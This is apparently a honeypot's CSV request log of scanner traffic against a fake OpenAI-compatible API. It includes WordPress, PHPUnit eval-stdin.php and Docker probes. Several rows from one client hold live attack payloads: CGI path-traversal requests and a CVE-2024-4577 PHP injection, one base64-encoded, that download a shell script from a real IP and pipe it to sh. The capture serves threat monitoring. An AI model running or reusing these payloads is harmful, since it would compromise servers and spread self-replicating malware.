request_id,timestamp_utc,client_ip,method,path,host,user_agent,x_forwarded_for,request_body_size,response_body_size,stream_chunk_count,model,user_content_flat,request_body_text,response_status,response_reason,response_body_text,duration_ms,error
074aa08b-29e7-474f-84e9-738fb01dd8b5,2026-03-29T02:56:05.026555+00:00,anon_64b8b72f,GET,/goods.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
ffe34bda-0fe4-47b2-8737-63396495fd1b,2026-03-29T02:56:05.348876+00:00,anon_64b8b72f,GET,/index.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
9bd40529-aeb7-45ab-b240-119852a9397d,2026-03-29T02:56:05.689244+00:00,anon_64b8b72f,GET,/init.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
0a4dc351-558c-4a0e-9d6c-8bc19d39cc8d,2026-03-29T02:56:06.013923+00:00,anon_64b8b72f,GET,/license.txt,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
a0de4b34-6bc8-4bcf-889a-f4e55819d316,2026-03-29T02:56:06.337940+00:00,anon_64b8b72f,GET,/login.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
8a720995-76db-4e08-97ce-897fd2f8c537,2026-03-29T02:56:06.661317+00:00,anon_64b8b72f,GET,/main.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
cff52fc4-5ed9-40c6-a3f6-56ca216e9a85,2026-03-29T02:56:06.984221+00:00,anon_64b8b72f,GET,/php.ini,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
6657f664-e6be-47c6-b697-19f81330c2fb,2026-03-29T02:56:07.306116+00:00,anon_64b8b72f,GET,/settings.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
993e5a01-c1c3-452c-bce5-6ff463b47165,2026-03-29T02:56:07.627551+00:00,anon_64b8b72f,GET,/wp-activate.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
5f979419-29e3-4a9f-bd82-c10cbbb74927,2026-03-29T02:56:07.954610+00:00,anon_64b8b72f,GET,/wp-blog-header.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
5e9d2a30-0d01-44e3-b67f-e99b3dedeea8,2026-03-29T02:56:08.278554+00:00,anon_64b8b72f,GET,/wp-comments-post.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
9d98511a-feca-4ba3-889e-406ebbb86e9e,2026-03-29T02:56:08.600124+00:00,anon_64b8b72f,GET,/wp-conffq.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
2f4f6d40-d3fb-409a-9157-35684ecc2637,2026-03-29T02:56:08.922360+00:00,anon_64b8b72f,GET,/wp-config-sample.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
d3a124e4-245d-4bf2-b640-345ac0e61620,2026-03-29T02:56:09.245098+00:00,anon_64b8b72f,GET,/wp-config.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
a2aec395-14cf-4ea1-af6b-75ca2b96b9f8,2026-03-29T02:56:09.569028+00:00,anon_64b8b72f,GET,/wp-cron.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
064a1ba1-6fca-406e-8b39-18112fdad4ca,2026-03-29T02:56:09.895528+00:00,anon_64b8b72f,GET,/wp-headre.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
62b9e357-db01-4ba1-9b26-f487605ab545,2026-03-29T02:56:10.218344+00:00,anon_64b8b72f,GET,/wp-links-opml.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
46daa738-3aae-446c-b19c-4866c32a767d,2026-03-29T02:56:10.551038+00:00,anon_64b8b72f,GET,/wp-load.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
77cbb10d-b97b-4fa4-b4c2-5e4871eab016,2026-03-29T02:56:10.873539+00:00,anon_64b8b72f,GET,/wp-login.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
130991e2-78e4-419e-9734-a209a99a100a,2026-03-29T02:56:11.196324+00:00,anon_64b8b72f,GET,/wp-mail.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
ad1a8562-5592-4583-a4ae-a2376c58d9dd,2026-03-29T02:58:54.541818+00:00,anon_492d3277,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,[honeypot-host],libredtail-http,,119,118,1,,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
c52ed4c2-e614-4987-9c87-6829a411336a,2026-03-29T02:58:54.949929+00:00,anon_492d3277,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,[honeypot-host],libredtail-http,,119,118,1,,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
bf1de1cf-7fdc-4a33-a82f-472d1ec293a4,2026-03-29T02:58:55.416635+00:00,anon_492d3277,POST,/hello.world,[honeypot-host],libredtail-http,,241,118,1,,"<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMzEuNTcuMjE2LjEyMS9zaCB8fCBjdXJsIC1zayBodHRwczovLzMxLjU3LjIxNi4xMjEvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>","<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMzEuNTcuMjE2LjEyMS9zaCB8fCBjdXJsIC1zayBodHRwczovLzMxLjU3LjIxNi4xMjEvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
fb228535-cfdb-492e-aa10-92166da29548,2026-03-29T02:58:55.861396+00:00,anon_492d3277,POST,/,[honeypot-host],libredtail-http,,241,118,1,,"<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMzEuNTcuMjE2LjEyMS9zaCB8fCBjdXJsIC1zayBodHRwczovLzMxLjU3LjIxNi4xMjEvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>","<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMzEuNTcuMjE2LjEyMS9zaCB8fCBjdXJsIC1zayBodHRwczovLzMxLjU3LjIxNi4xMjEvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
9d4c160f-88b9-435b-9e4b-618df1839982,2026-03-29T02:58:56.241057+00:00,anon_492d3277,GET,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
d3755422-4dc9-46a1-b05f-ccca76ed24f5,2026-03-29T02:58:56.690564+00:00,anon_492d3277,GET,/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
ad9a624c-82db-47f0-91bf-0f5e051ab357,2026-03-29T02:58:57.166789+00:00,anon_492d3277,GET,/vendor/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
0a7c216c-755e-4946-a5ff-d4e890ddb221,2026-03-29T02:58:57.645079+00:00,anon_492d3277,GET,/vendor/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
d276066c-0977-457f-8c96-8b26a5b568cd,2026-03-29T02:58:57.953202+00:00,anon_492d3277,GET,/vendor/phpunit/phpunit/LICENSE/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
6387e64e-5877-4f8b-afeb-16a0a92a1c9f,2026-03-29T02:58:58.370636+00:00,anon_492d3277,GET,/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
4570f4df-f80b-4409-b7bd-e58bea6c7df8,2026-03-29T02:58:58.829470+00:00,anon_492d3277,GET,/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
b996404d-92cf-4494-9a0d-4f8012e28a97,2026-03-29T02:58:59.234435+00:00,anon_492d3277,GET,/phpunit/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
33083e2a-6f9e-4c6d-92f1-24da49db5adb,2026-03-29T02:58:59.643465+00:00,anon_492d3277,GET,/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
42f82af1-f3ac-412c-bcd4-f40d800d84a9,2026-03-29T02:59:00.066943+00:00,anon_492d3277,GET,/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
39505b6d-4819-4035-a069-d5a0f4dbf927,2026-03-29T02:59:00.550264+00:00,anon_492d3277,GET,/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
1a9963d9-bc41-4e9f-bdb9-6a1576aa1712,2026-03-29T02:59:01.074633+00:00,anon_492d3277,GET,/lib/phpunit/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
600ee887-4896-40ad-a4ad-c32f78dfa0ec,2026-03-29T02:59:01.543321+00:00,anon_492d3277,GET,/lib/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
1d3d025c-1cea-4286-abcd-a9010d08b306,2026-03-29T02:59:01.947339+00:00,anon_492d3277,GET,/lib/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
4a03e9ed-3ae6-4e16-8292-edbc6bef594e,2026-03-29T02:59:02.344997+00:00,anon_492d3277,GET,/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
1f09b879-373d-4afa-8524-99a95724b3bd,2026-03-29T02:59:02.721888+00:00,anon_492d3277,GET,/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
f17ab7a6-cc03-49dd-bd5c-bc159b9c2886,2026-03-29T02:59:03.059816+00:00,anon_492d3277,GET,/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
4746bdc7-308b-40a8-b120-ca51e95318a5,2026-03-29T02:59:03.440332+00:00,anon_492d3277,GET,/ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
efcdbaa3-a69f-497b-b5ae-124028bea33b,2026-03-29T02:59:03.866826+00:00,anon_492d3277,GET,/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
04b27175-95e3-49d1-87df-ff7308ac5d2f,2026-03-29T02:59:04.360690+00:00,anon_492d3277,GET,/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
7ab2cc75-6c1a-4df8-a135-bb7557eede27,2026-03-29T02:59:04.855390+00:00,anon_492d3277,GET,/ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
26db4194-2e6a-4629-b0d3-1f053718eb8a,2026-03-29T02:59:05.292461+00:00,anon_492d3277,GET,/V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
f4e3535f-991a-473b-b6a9-319627f16843,2026-03-29T02:59:05.741031+00:00,anon_492d3277,GET,/tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
e187c8f0-aa83-4e1a-8414-39235a0c53cb,2026-03-29T02:59:06.214457+00:00,anon_492d3277,GET,/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
c702501a-05bb-402b-b7aa-7c89e5b7e249,2026-03-29T02:59:06.578380+00:00,anon_492d3277,GET,/testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
8bae91d1-a63d-4955-957f-15ed5d544df6,2026-03-29T02:59:07.044172+00:00,anon_492d3277,GET,/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
21db6829-274b-4dff-b22c-8b3b15405c90,2026-03-29T02:59:07.468521+00:00,anon_492d3277,GET,/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
86222e60-58a2-49f0-a0bb-cf98e8e2e2d3,2026-03-29T02:59:07.883985+00:00,anon_492d3277,GET,/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
ade870ff-5d59-4135-a129-17bde142c3bd,2026-03-29T02:59:08.360708+00:00,anon_492d3277,GET,/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
eaa2102a-e0b0-4563-ab0a-1773d839b49a,2026-03-29T02:59:08.816316+00:00,anon_492d3277,GET,/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
abcb8e24-701d-4014-82f4-55585a0d9d88,2026-03-29T02:59:09.272969+00:00,anon_492d3277,GET,/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
11dd846e-ccb1-4f21-b483-eb696070cd28,2026-03-29T02:59:09.696754+00:00,anon_492d3277,GET,/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
69b6b27d-9459-435d-b2f3-e0fd19e437fd,2026-03-29T02:59:10.218526+00:00,anon_492d3277,GET,/workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
5968d10d-49e1-4f05-a8e2-2782f14b4708,2026-03-29T02:59:10.828790+00:00,anon_492d3277,GET,/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
062b984e-dd98-4755-8a38-89a4a35f9b9f,2026-03-29T02:59:11.272968+00:00,anon_492d3277,GET,/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
a94ffa40-87ae-49d3-a2da-c31730f1c731,2026-03-29T02:59:11.808806+00:00,anon_492d3277,GET,/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
db01d139-cda0-4e0b-a790-36972d34b30e,2026-03-29T02:59:12.343510+00:00,anon_492d3277,GET,/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
4a1bf2d1-683e-424f-9fb1-21c61ce5b5d3,2026-03-29T02:59:12.921609+00:00,anon_492d3277,GET,/index.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
501dc086-e018-43ba-8500-d387bced2540,2026-03-29T02:59:13.429495+00:00,anon_492d3277,GET,/public/index.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
adfdfdc6-c154-46bd-a860-d51db35cf2ec,2026-03-29T02:59:13.935369+00:00,anon_492d3277,GET,/index.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
1025e505-1b37-4edc-a1c0-f459bd5c8b51,2026-03-29T02:59:14.381544+00:00,anon_492d3277,GET,/index.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
20b8a51c-e24e-4f7f-a3dd-2f8fd1c503f6,2026-03-29T02:59:14.711259+00:00,anon_492d3277,GET,/containers/json,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
1bcc3a27-914f-466d-bf03-8bf064eca7d0,2026-03-29T02:59:56.943660+00:00,anon_1beaa3df,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
a813550e-c1a4-40e0-b877-03aba20290fa,2026-03-29T03:48:18.074879+00:00,anon_1beaa3df,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
261091aa-265e-405e-ba22-7d4b68528521,2026-03-29T03:50:12.705873+00:00,anon_832f6c9e,GET,/.well-known/security.txt,[honeypot-host],"Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
70814c64-3738-4995-943e-2d4ecd0d987d,2026-03-29T04:03:07.669804+00:00,anon_73807074,GET,/,[honeypot-host],Mozilla/5.0 (compatible; ModatScanner/1.2; +https://modat.io/),,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
87fa6353-6166-4f3a-b676-3054e98708ca,2026-03-29T04:43:40.135767+00:00,anon_1beaa3df,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
